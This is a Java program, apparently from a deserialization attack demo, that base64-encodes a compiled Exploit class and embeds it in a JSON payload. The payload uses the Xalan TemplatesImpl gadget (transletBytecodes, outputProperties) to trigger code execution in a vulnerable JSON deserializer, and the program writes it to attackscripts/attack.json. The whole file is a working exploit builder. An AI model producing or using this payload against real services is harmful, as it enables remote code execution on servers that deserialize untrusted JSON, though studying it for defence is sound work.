import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.Base64;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

public class EncodeExploit {

  public static void main(String[] args) throws Exception {

    Path path = Paths.get("target/classes/Exploit.class");
    Charset charset = StandardCharsets.UTF_8;
    byte[] classBytes = Files.readAllBytes(path);
    byte[] encodedBytes = Base64.getEncoder().encode(classBytes);

    System.out.println("Crafted Exploit (Encoded) :");
    System.out.println(new String(encodedBytes));


    JSONObject craftObject = new JSONObject();

    craftObject.put("question", "king_of_rap");
    craftObject.put("option", "Eminem");

    JSONArray craftList = new JSONArray();
    craftList.add("org.apache.xalan.xsltc.trax.TemplatesImpl");

    JSONObject transletObject = new JSONObject();

    JSONArray transletArray = new JSONArray();
    transletArray.add(new String(encodedBytes));

    transletObject.put("transletBytecodes",transletArray);

    transletObject.put("transletName", "businessObject");
    transletObject.put("outputProperties", new JSONObject());

    craftList.add(transletObject);

    craftObject.put("feedback", craftList);

    System.out.println("Crafted JSON (with embedded bytes) :");
    System.out.println(craftObject.toJSONString());

    try (FileWriter file = new FileWriter("./" + "attackscripts/attack.json")) {

      file.write(craftObject.toJSONString());
      file.flush();

    } catch (IOException e) {
      System.out.println("Failed to write file");
      e.printStackTrace();
    }

  }

  private static String getRandAlphaNumeric(int len) {

    char[] ch = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".toCharArray();

    char[] c = new char[len];
    SecureRandom random = new SecureRandom();
    for (int i = 0; i < len; i++) {
      c[i] = ch[random.nextInt(ch.length)];
    }

    return new String(c);
  }
}